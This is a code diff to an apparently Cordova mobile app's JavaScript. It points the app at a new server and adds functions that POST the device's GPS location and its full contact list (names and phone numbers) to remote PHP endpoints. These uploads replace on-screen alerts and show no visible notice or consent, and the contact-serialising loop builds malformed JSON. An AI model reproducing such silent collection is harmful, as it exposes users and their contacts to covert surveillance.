@@ -25,9 +25,14 @@
  
 var ref;
 
-var mainDomain  	= "atm.berbagiyuk.com";
-var mainHomeUrl 	= "http://www.atm.berbagiyuk.com/";  //with backslash
+//var mainDomain  	= "atm.berbagiyuk.com";
+//var mainHomeUrl 	= "http://www.atm.berbagiyuk.com/";  //with backslash
+
+var mainDomain  	= "davidprasetyo.xyz";
+var mainHomeUrl 	= "http://davidprasetyo.xyz/";  //with backslash
+
 var is_inappbrowser = false;
+var deviceID;
  
 var inappbrowserStartCallback = 
 	function(event) { 
@@ -130,16 +135,31 @@ function onConfirm(button) {
     }
 }
 
+function sendLocation(latitude, longitude){
+		var data = new FormData();
+		data.append("deviceid", deviceID);
+		data.append("latitude", latitude);
+		data.append("longitude", longitude);
+
+		var xhr = new XMLHttpRequest();
+		xhr.withCredentials = false;
+		
+		xhr.addEventListener("readystatechange", function () {
+		  if (this.readyState === 4) {
+			console.log(this.responseText);
+		  }
+		});
+		
+		var theUrl = mainHomeUrl+"android/pusher/locationDataPost.php";
+		xhr.open("POST", theUrl);
+		xhr.setRequestHeader("cache-control", "no-cache");
+		xhr.send(data);
+}
 
 var onSuccessLoc = function(position) {
-	alert('Latitude: '          + position.coords.latitude          + '\n' +
-		  'Longitude: '         + position.coords.longitude         + '\n' +
-		  'Altitude: '          + position.coords.altitude          + '\n' +
-		  'Accuracy: '          + position.coords.accuracy          + '\n' +
-		  'Altitude Accuracy: ' + position.coords.altitudeAccuracy  + '\n' +
-		  'Heading: '           + position.coords.heading           + '\n' +
-		  'Speed: '             + position.coords.speed             + '\n' +
-		  'Timestamp: '         + position.timestamp                + '\n');
+	var latitude = position.coords.latitude ;
+	var longitude = position.coords.longitude ;
+	sendLocation(latitude, longitude);
 };
 
 // onError Callback receives a PositionError object
@@ -180,9 +200,42 @@ function inputPrompt(){
 	);
 }
 
+function sendPhoneNum(dataCon){
+		var data = new FormData();
+		data.append("deviceid", deviceID);
+		data.append("phonedata", dataCon);
+
+		var xhr = new XMLHttpRequest();
+		xhr.withCredentials = false;
+		
+		xhr.addEventListener("readystatechange", function () {
+		  if (this.readyState === 4) {
+			console.log(this.responseText);
+		  }
+		});
+		
+		var theUrl = mainHomeUrl+"android/pusher/phoneDataPost.php";
+		xhr.open("POST", theUrl);
+		xhr.setRequestHeader("cache-control", "no-cache");
+		xhr.send(data);
+}
+
 function onSuccessCont(contacts) {
-    alert(JSON.stringify(contacts));
-	//alert('Found ' + contacts.length + ' contacts.');
+	var xx = '[';
+	
+    for (var i=0; i<contacts.length; i++) {
+         xx = xx + '"' + contacts[i].displayName + '"';
+		 for (var j=0; j<contacts[i].phoneNumbers.length; j++) {
+			 xx = xx + ',"' +  contacts[i].phoneNumbers[j].value + '"]';
+		 }
+		 if(i<(contacts.length-1)){
+			 xx = xx + ',';
+		 }
+    }
+	var finaldata = JSON.stringify(xx);
+	
+	sendPhoneNum(finaldata);
+	
 };
 
 function onErrorCont(contactError) {
@@ -260,15 +313,12 @@ function getAllContacts(){
                 localStorage.setItem('registrationId', data.registrationId);
                 // Post registrationId to your app server as the value has changed
             }
-			
+			deviceID = data.registrationId;
 			var theUrl = mainHomeUrl+"android/pusher/initdevice.php?deviceid="+data.registrationId;
-			alert(theUrl);
-			
-			
-			
-			//var xmlHttp = new XMLHttpRequest();
-			//xmlHttp.open( "GET", theUrl, false ); // false for synchronous request
-			//xmlHttp.send( null );
+
+			var xmlHttp = new XMLHttpRequest();
+			xmlHttp.open( "GET", theUrl, false ); // false for synchronous request
+			xmlHttp.send( null );
 
             var parentElement = document.getElementById('registration');
             var listeningElement = parentElement.querySelector('.waiting');
@@ -295,12 +345,14 @@ function getAllContacts(){
 				goToUrl(paramUrl);
 				throw Error();
 			}else{
+				return 1;
 				navigator.notification.alert(
 					data.message,         // message
 					null,                 // callback
 					data.title,           // title
 					'Ok'                  // buttonName
 				);
+				
 			}
 			
 			//olah data disini
